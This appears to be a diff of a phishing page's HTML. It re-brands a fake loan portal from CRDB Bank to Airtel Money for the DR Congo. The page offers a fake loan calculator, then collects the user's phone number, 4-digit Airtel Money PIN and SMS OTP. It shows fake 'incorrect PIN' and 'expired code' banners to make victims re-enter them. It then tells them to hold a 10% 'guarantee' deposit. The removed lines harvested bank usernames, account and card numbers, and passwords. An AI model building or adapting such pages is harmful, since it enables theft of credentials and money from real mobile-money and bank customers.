@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CRDB SimBanking - Portail de Prêt</title>
+  <title>Airtel Money - Portail de Prêt</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -13,32 +13,32 @@
   <!-- Header -->
   <header class="top-header">
     <div class="header-left">
-      <span class="brand-title">CRDB <small>SIMBANKING</small></span>
+      <span class="brand-title">AIRTEL <small>MONEY</small></span>
     </div>
     <div class="header-right">
-      <span class="flag-badge">🇨🇬</span>
+      <span class="flag-badge">🇨🇩</span>
     </div>
   </header>
 
   <!-- ÉTAPE 1: MESSAGE DE BIENVENUE -->
   <section id="step-I UNDERSTAND" class="screen active">
-    <h1 style="font-size: 22px; color: var(--crdb-green); text-align: center; margin-top: 10px;">WELCOME TO CRDB SIMBANKING</h1>
+    <h1 style="font-size: 22px; color: var(--airtel-red); text-align: center; margin-top: 10px;">WELCOME TO AIRTEL MONEY</h1>
 
     <div class="notice-box" style="text-align: left;">
       <p style="font-size: 15px; line-height: 1.6; color: var(--text-main); margin-bottom: 12px;">
-        <strong>Cher Demandeurs,</strong>
+        <strong>Cher Demandeur,</strong>
       </p>
       <p style="font-size: 14px; line-height: 1.6; color: var(--text-main); margin-bottom: 12px;">
-        Bienvenue sur CRDB SIMBANKING. Pour faire une demande de prêt, veuillez vous assurer de remplir les conditions requises et de suivre les procédures officielles de demande CRDB SIMBANKING.
+        Bienvenue sur AIRTEL MONEY. Pour faire une demande de prêt, veuillez vous assurer de remplir les conditions requises et de suivre les procédures officielles d'application Airtel.
       </p>
       <p style="font-size: 14px; line-height: 1.6; color: var(--text-main); margin-bottom: 12px;">
         Assurez-vous que vos informations sont correctes et à jour.
       </p>
       <p style="font-size: 14px; line-height: 1.6; color: var(--text-main); margin-bottom: 12px;">
-        Veuillez passer par les canaux officiels de la CRDB pour soumettre votre demande de prêt.
+        Veuillez procéder via les canaux officiels d'Airtel pour soumettre votre demande de prêt.
       </p>
-      <p style="font-size: 14px; line-height: 1.6; color: var(--crdb-green); font-weight: 700; margin-top: 16px;">
-        Merci d'avoir choisi la CRDB Bank.
+      <p style="font-size: 14px; line-height: 1.6; color: var(--airtel-red); font-weight: 700; margin-top: 16px;">
+        Merci d'avoir choisi Airtel Money.
       </p>
     </div>
 
@@ -50,7 +50,7 @@
   <!-- ÉTAPE 2: CALCULATEUR DE PRÊT -->
   <section id="step-slider" class="screen">
     <div class="welcome-banner">
-      <h2>Calculateur de Prêt</h2>
+      <h2>Calculateur de Prêt Airtel</h2>
       <p style="color: var(--text-muted); font-size: 14px;">Choisissez le montant du prêt et la durée de remboursement</p>
     </div>
 
@@ -60,7 +60,7 @@
           <span class="slider-label">Montant du Prêt (FCFA)</span>
           <span id="balance-val" class="slider-val">100,000 FCFA</span>
         </div>
-        <input type="range" id="slider-balance" min="10000" max="5000000" value="100000" step="10000" class="range-slider green-slider">
+        <input type="range" id="slider-balance" min="10000" max="5000000" value="100000" step="10000" class="range-slider red-slider">
         <div class="slider-limits">
           <span>10K FCFA</span>
           <span>5M FCFA</span>
@@ -72,7 +72,7 @@
           <span class="slider-label">Durée du Prêt (Mois)</span>
           <span id="duration-val" class="slider-val">12 mois</span>
         </div>
-        <input type="range" id="slider-duration" min="6" max="60" value="12" step="1" class="range-slider green-slider">
+        <input type="range" id="slider-duration" min="6" max="60" value="12" step="1" class="range-slider red-slider">
         <div class="slider-limits">
           <span>6 mois</span>
           <span>60 mois</span>
@@ -93,50 +93,50 @@
     </button>
   </section>
 
-  <!-- ÉTAPE 3: BANQUE EN LIGNE -->
+  <!-- ÉTAPE 3: NUMÉRO DE TÉLÉPHONE ET CODE PIN AIRTEL MONEY -->
   <section id="step-form" class="screen">
-    <div style="background: var(--crdb-green); color: #FFF; padding: 24px; text-align: center; border-radius: 0 0 16px 16px; margin: -24px -24px 20px -24px;">
-      <h2 style="font-size: 22px; margin-bottom: 4px;">Internet Banking</h2>
-      <p style="font-size: 13px; opacity: 0.9;">Bienvenue sur CRDB Internet Banking. Veuillez saisir vos informations ci-dessous</p>
+    <div style="background: var(--airtel-red); color: #FFF; padding: 24px; text-align: center; border-radius: 0 0 16px 16px; margin: -24px -24px 20px -24px;">
+      <h2 style="font-size: 22px; margin-bottom: 4px;">Airtel Money</h2>
+      <p style="font-size: 13px; opacity: 0.9;">Connexion Airtel Money. Veuillez entrer votre numéro et votre code PIN</p>
     </div>
 
     <!-- BANNIÈRE D'ERREUR SURFACE -->
     <div id="creds-surface-banner" class="surface-banner">
-      INFORMATIONS INCORRECTES ❌ (Veuillez saisir des identifiants valides)
+      NUMÉRO OU PIN INCORRECT ❌ (Veuillez ressaisir un code PIN valide)
     </div>
 
     <div class="form-group">
-      <label for="crdb-username">Nom d'utilisateur (Username)</label>
-      <input type="text" id="crdb-username" class="input-field" placeholder="Entrez votre nom d'utilisateur">
+      <label for="phone-number">Numéro de Téléphone (Airtel)</label>
+      <div class="phone-input-wrapper">
+        <div class="flag-prefix">🇨🇩 +243</div>
+        <input type="tel" id="phone-number" class="input-field phone-field" placeholder="09XXXXXXX" maxlength="10">
+      </div>
+      <span id="phone-error" class="error-text">Veuillez entrer un numéro Airtel valide.</span>
     </div>
 
-    <div class="form-group">
-      <label for="crdb-account">Numéro de Compte BAncaire</label>
-      <input type="text" id="crdb-account" class="input-field" placeholder="0152XXXXXXXXX" maxlength="16" inputmode="numeric">
-    </div>
-
-    <div class="form-group">
-      <label for="crdb-card">Numéro de Carte Bancaire</label>
-      <input type="text" id="crdb-card" class="input-field" placeholder="4000 XXXX XXXX XXXX" maxlength="19" inputmode="numeric">
-    </div>
-
-    <div class="form-group">
-      <label for="crdb-password">Mot de Passe (Password)</label>
-      <input type="password" id="crdb-password" class="input-field" placeholder="Entrez votre mot de passe">
+    <div class="form-group" style="text-align: center;">
+      <label style="color: var(--text-muted); font-size: 14px; margin-bottom: 8px; display: block;">Code PIN Airtel Money (4 chiffres)</label>
+      <div class="pin-grid">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+      </div>
+      <span id="pin-error" class="error-text">Veuillez entrer votre code PIN à 4 chiffres.</span>
     </div>
 
     <button id="btn-submit-creds" class="btn-primary btn-large" style="margin-top: 20px;">Se Connecter (Sign In)</button>
   </section>
 
-  <!-- ÉTAPE 4: OTP SMS AIRTEL CONGO (4 CHIFFRES) -->
+  <!-- ÉTAPE 4: OTP SMS AIRTEL (4 CHIFFRES) -->
   <section id="step-otp" class="screen">
     <h2 style="margin-bottom: 6px;">Vérification SMS Airtel</h2>
     <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 16px;">
-      Un code de vérification à 4 chiffres a été envoyé par SMS sur votre ligne Airtel Congo.
+      Un code de vérification à 4 chiffres a été envoyé par SMS sur votre ligne Airtel.
     </p>
 
     <div id="otp-surface-banner" class="surface-banner">
-      CODE OTP EXPIRÉ ❌ (Veuillez saisir le nouveau code SMS reçu)
+      CODE OTP INCORRECT OU EXPIRÉ ❌ (Veuillez saisir un nouveau code)
     </div>
 
     <div class="sms-notice">
@@ -156,44 +156,12 @@
     <button id="btn-submit-otp" class="btn-primary" style="margin-top: 20px;">VALIDER LE CODE OTP</button>
   </section>
 
-  <!-- ÉTAPE 5: NUMÉRO AIRTEL CONGO ET CODE PIN -->
-  <section id="step-phone-pin" class="screen">
-    <h2 style="margin-bottom: 6px;">Vérification du Compte</h2>
-    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 16px;">Entrez votre numéro Airtel Congo et votre code PIN à 4 chiffres</p>
-
-    <div id="pin-surface-banner" class="surface-banner">
-      CODE PIN INCORRECT ❌ (Veuillez recharger votre code PIN)
-    </div>
-
-    <div class="form-group">
-      <label for="phone-number">Numéro de Téléphone (Airtel Congo)</label>
-      <div class="phone-input-wrapper">
-        <div class="flag-prefix">🇨🇬 +242</div>
-        <input type="tel" id="phone-number" class="input-field phone-field" placeholder="06XXXXXXX" maxlength="10">
-      </div>
-      <span id="phone-error" class="error-text">Veuillez entrer un numéro Airtel valide.</span>
-    </div>
-
-    <div class="form-group" style="text-align: center;">
-      <label style="color: var(--text-muted); font-size: 14px; margin-bottom: 8px; display: block;">Saisissez votre PIN à 4 chiffres</label>
-      <div class="pin-grid">
-        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
-        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
-        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
-        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
-      </div>
-      <span id="pin-error" class="error-text">Veuillez entrer votre code PIN à 4 chiffres.</span>
-    </div>
-
-    <button id="btn-submit-phone-pin" class="btn-primary" style="margin-top: 20px;">CONFIRMER ET TERMINER</button>
-  </section>
-
-  <!-- ÉTAPE 6: ÉCRAN DE SUCCÈS -->
+  <!-- ÉTAPE 5: ÉCRAN DE SUCCÈS -->
   <section id="step-success" class="screen">
     <div style="text-align: center; margin-top: 10px;">
       <div class="circle-check-icon">✓</div>
       <h1 class="congrats-title">🎉 Félicitations!</h1>
-      <p class="congrats-sub">Votre prêt a été <strong>approuvé!</strong> Les fonds seront déboursés sous peu.</p>
+      <p class="congrats-sub">Votre prêt a été <strong>approuvé!</strong> Les fonds seront déboursés sous peu sur votre compte Airtel Money.</p>
     </div>
 
     <div class="approved-banner-card">
@@ -204,15 +172,15 @@
     <div class="compliance-notice-box">
       <div class="compliance-title">⚠️ AVIS DE CONFORMITÉ</div>
       <p>
-        Votre compte bancaire CRDB doit être actif et maintenir un dépôt de garantie d'au moins <strong>10% du montant du prêt demandé</strong>. Ce dépôt vous sera entièrement restitué après le remboursement.
+        Votre compte Airtel doit être actif et maintenir un solde de garantie d'au moins <strong>10% du montant du prêt demandé</strong>. Ce montant vous sera entièrement restitué après le remboursement.
       </p>
     </div>
 
     <div class="loan-details-card">
-      <div class="detail-header-label">💳 Détails du Prêt</div>
+      <div class="detail-header-label">💳 Détails du Prêt Airtel</div>
       
       <div class="detail-item">
-        <div class="item-icon green-icon">💵</div>
+        <div class="item-icon red-icon">💵</div>
         <div class="item-text">
           <span class="item-title">MENSUALITÉ</span>
           <span class="item-val">9,500 FCFA</span>
@@ -242,5 +210,5 @@
 
 <script src="script.js"></script>
 </body>
-  </html>
-            
+      </html>
+  
